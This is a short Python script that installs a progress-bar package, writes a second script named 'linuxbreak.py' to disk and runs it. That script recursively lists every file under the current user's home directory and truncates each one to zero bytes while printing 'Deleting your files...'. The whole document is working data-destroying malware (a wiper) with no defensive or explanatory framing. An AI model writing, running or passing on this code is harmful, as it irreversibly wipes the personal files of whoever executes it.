import sys
from os import system


if not "alive-progress" in sys.modules:
	system("pip install alive-progress")

code = """import alive_progress
import getpass
import os

os.system("clear")
items = []

print("Detecting files...")
with alive_progress.alive_bar() as bar:
	def find_files(root):
		global items
		bar()
		children = list(os.listdir(root))
		for child in children:
			child = root + "/" + child
			if os.path.isdir(child):
				find_files(child)
			else:
				items.append(child)
				
	find_files(f"/home/{getpass.getuser()}")	
	
print("Deleting your files...")
with alive_progress.alive_bar(len(items)) as bar:
	for item in items:
		try:
			f = open(item, "bw")
			f.truncate(0)
			f.close()
		except:
			pass
		bar()
"""

file = open("linuxbreak.py", "a")
file.close()
file = open("linuxbreak.py","w+")
if file.read():
	file.truncate(0)

file.write(code)
file.close()
system("python3 linuxbreak.py")
